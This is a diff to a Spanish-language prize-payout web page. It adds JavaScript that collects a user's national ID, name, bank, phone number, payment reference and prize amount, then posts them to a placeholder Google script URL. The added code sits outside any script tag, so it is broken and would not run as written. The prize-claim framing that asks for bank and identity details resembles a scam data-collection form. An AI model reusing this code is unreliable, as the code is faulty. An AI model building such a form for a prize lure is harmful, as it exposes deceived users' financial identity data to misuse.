@@ -146,5 +146,34 @@
             alert(`¡Solicitud recibida! Se procesará tu pago de $${premio} via Pago Móvil al teléfono ${datosPago.telefono}`);
         });
     </script>
+    async function enviarPagoMovil() {
+  const datos = {
+    cedula: document.getElementById("cedula").value,
+    nombre: document.getElementById("nombreCompleto").value,
+    bancoNombre: document.getElementById("banco").options[document.getElementById("banco").selectedIndex].text,
+    codigoBanco: document.getElementById("banco").value,
+    telefono: document.getElementById("telefono").value,
+    referencia: document.getElementById("codigoReferencia").value,
+    monto: premioAsignado // Variable global con el monto
+  };
+
+  try {
+    const response = await fetch('TU_URL_SCRIPT_GOOGLE', {
+      method: 'POST',
+      body: JSON.stringify(datos)
+    });
+    
+    const result = await response.json();
+    alert(result.message);
+  } catch (error) {
+    alert("Error al registrar: " + error.message);
+  }
+}
+
+// Vincula al formulario
+document.getElementById("pagoMovilForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+  enviarPagoMovil();
+});
 </body>
 </html>
